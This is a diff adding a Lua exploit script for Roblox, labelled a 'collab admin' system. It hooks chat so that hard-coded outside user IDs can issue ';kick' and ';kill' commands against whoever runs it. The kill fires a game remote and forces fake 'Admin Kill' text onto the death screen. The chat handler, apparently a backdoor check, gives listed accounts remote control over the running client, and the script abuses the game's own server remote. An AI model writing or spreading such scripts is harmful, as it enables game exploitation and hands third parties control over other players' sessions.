@@ -1,0 +1,132 @@
+-- Collab Admin + Remote-Driven Death System
+
+local Players = game:GetService('Players')
+local TextChatService = game:GetService('TextChatService')
+local LocalP = Players.LocalPlayer
+
+-- 📌 Remote reference
+local remote = LocalP:WaitForChild('TCP')
+
+-- 📌 Grab DeathInfo UI
+local deathInfo = LocalP:WaitForChild('PlayerGui')
+    :WaitForChild('GameUI')
+    :WaitForChild('SpawnScreen')
+    :WaitForChild('DeathInfo')
+
+-- 🔒 Admin table
+getgenv().AdminTable = {
+    [9563221202] = { Access = 5 }, -- example admin
+    [987654321] = { Access = 4 },
+}
+
+-- 🔎 Player search
+getgenv().psearch = function(Name)
+    for _, p in ipairs(Players:GetPlayers()) do
+        if string.lower(p.Name):sub(1, #Name) == string.lower(Name) then
+            return p
+        end
+    end
+end
+
+-- 🛠️ UI temp override helper
+local function enforceTemp(obj, newText, duration)
+    if not obj or not obj:IsA('TextLabel') then
+        return
+    end
+    local oldText = obj.Text
+    obj.Text = newText
+
+    local conn
+    conn = obj:GetPropertyChangedSignal('Text'):Connect(function()
+        if obj.Text ~= newText then
+            obj.Text = newText
+        end
+    end)
+
+    task.delay(duration or 3, function()
+        if conn then
+            conn:Disconnect()
+        end
+        if obj and obj:IsA('TextLabel') then
+            obj.Text = oldText
+        end
+    end)
+end
+
+local function setDeathInfoTemp(updates, duration)
+    for labelName, newText in pairs(updates) do
+        local obj = deathInfo:FindFirstChild(labelName)
+        if obj then
+            enforceTemp(obj, newText, duration)
+        end
+    end
+end
+
+-- ⚡ Commands
+getgenv().AdminCmdList = {
+    ['kick'] = {
+        CommandFunc = function(Player, self, CmdPlayer)
+            if Player == LocalP or Player == 'all' then
+                LocalP:Kick(self)
+            end
+        end,
+        Clearence = { [5] = true },
+    },
+
+    ['kill'] = {
+        CommandFunc = function(Player, self, CmdPlayer)
+            if Player == LocalP or Player == 'all' then
+                -- 🔥 Use remote-driven death
+                remote:FireServer(5)
+
+                -- 🎨 Optional death info override
+                setDeathInfoTemp({
+                    KillerDisplayName = 'XD',
+                    KillerName = CmdPlayer.Name or 'ADMIN',
+                    KillerQuip = '"Eliminated!"',
+                    Title = '☠ Admin Kill ☠',
+                }, 4)
+            end
+        end,
+        Clearence = { [4] = true, [5] = true },
+    },
+}
+
+-- 📨 Chat command processor
+getgenv().BDCheck = function(Sender, Chat)
+    if Chat:sub(1, 1) == ';' then
+        local args = string.split(Chat:sub(2), ' ')
+        local Command = getgenv().AdminCmdList[table.remove(args, 1)]
+        local targ1 = getgenv().psearch(args[1] or '')
+        table.remove(args, 1)
+
+        if Command and targ1 then
+            local accessData = getgenv().AdminTable[Sender.UserId]
+            if accessData and Command.Clearence[accessData.Access] then
+                Command.CommandFunc(targ1, table.concat(args, ' '), Sender)
+            end
+        end
+    end
+end
+
+-- 🔗 Hook chat
+local function hookChat(channel)
+    channel.MessageReceived:Connect(function(msg)
+        local speaker = Players:GetPlayerByUserId(msg.TextSource.UserId)
+        if speaker then
+            getgenv().BDCheck(speaker, msg.Text)
+        end
+    end)
+end
+
+for _, channel in ipairs(TextChatService.TextChannels:GetChildren()) do
+    if channel:IsA('TextChannel') then
+        hookChat(channel)
+    end
+end
+
+TextChatService.TextChannels.ChildAdded:Connect(function(channel)
+    if channel:IsA('TextChannel') then
+        hookChat(channel)
+    end
+end)
